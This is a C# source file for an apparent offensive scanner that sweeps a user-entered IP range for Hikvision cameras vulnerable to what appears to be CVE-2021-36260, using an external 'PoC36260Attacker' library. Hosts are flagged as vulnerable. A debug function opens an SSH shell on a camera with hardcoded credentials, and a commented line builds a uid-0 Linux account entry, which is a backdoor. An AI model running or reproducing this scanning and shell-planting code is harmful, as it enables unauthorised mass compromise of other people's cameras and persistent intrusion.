using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Attacker36260Lib;

namespace HikCameraScan
{
    public class PoC36260Scan : ScanConfig
    {
        public PoC36260Scan(string startIP, string endIP, IContentInterpreter interpreter) : base(
            startIP, endIP, "", interpreter)
        {
            _resulTypeInfo = "36260WeakPoint";
        }

        public static PoC36260Scan LoadFromConsole()
        {
            string? startIP, endIP;
            Console.WriteLine("Config type:PoC36260");
         
            
            
            
            
            
            Console.Write("Start IP:");
            startIP = Console.ReadLine();
            Console.Write("End IP:");
            endIP = Console.ReadLine();
            if (startIP == null || endIP == null)
            {
                Console.WriteLine("Wrong input!");
                throw new InvalidDataException("Null data");
            }
            return new PoC36260Scan(startIP, endIP, new PoC36260Interpreter());
        }
    }

    public class PoC36260Interpreter : IContentInterpreter
    {
        public bool TestExist(IPAddress ip, ScanConfig config, CamDetect detector)
        {
            try
            {
                using (var ping = new Ping())
                {
                    var options = new PingOptions
                    {
                        DontFragment = true
                    };

                    var data = "ping_test_data";
                    var buffer = System.Text.Encoding.ASCII.GetBytes(data);
                    var timeout = 10; // 10ms timeout for each packet

                    var successfulPings = 0;
                    for (var i = 0; i < 2; i++)
                    {
                        var reply = ping.Send(ip, timeout, buffer, options);
                        if (reply.Status == IPStatus.Success)
                        {
                            successfulPings++;
                        }
                    }

                    if (successfulPings <= 0)
                    {
                        return false;
                    }
                    try
                    {
                        PoC36260Attacker poc = new PoC36260Attacker(detector.Client, ip);
                        if (poc.TestExist() == VulnerableCode.Vulnerable)
                        {
                            return true;
                        }
                        else
                        {
                            return false;
                        }
                    }catch (Exception e)
                    {
                        return false ;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        public CamDetectResult CamContentDetect(IPAddress ip, CamDetect detector)
        {
            PoC36260Attacker attacker = new PoC36260Attacker(detector.Client, ip);
            //this.DebugFunc(attacker);
            if(attacker.TestExist() == VulnerableCode.Vulnerable)
            {
                CamDetectResult result= new CamDetectResult { IsCam = true, IP = ip, CamUrl = attacker.Proto + "://" + ip.ToString(), AdditionInfo = "Vulnerable", Port = attacker.Proto == "http" ? 80 : 443 };
                return result;
            }
            else
            {
                CamDetectResult result = new CamDetectResult { IsCam = false, IP = ip, CamUrl = attacker.Proto + "://" + ip.ToString(), AdditionInfo = "Not Vulnerable", Port = attacker.Proto == "http" ? 80 : 443 };
                return result;
            }
        }
        public void DebugFunc(PoC36260Attacker attacker)
        {
            attacker.PullUpSSHShell("usrx", "114514alice",1337);
            //Console.WriteLine(PoC36260Attacker.GenerateLinuxAccountInfo("src", "123456", 0, 0, "src", "/", "/bin/sh"));
        }
    }
}
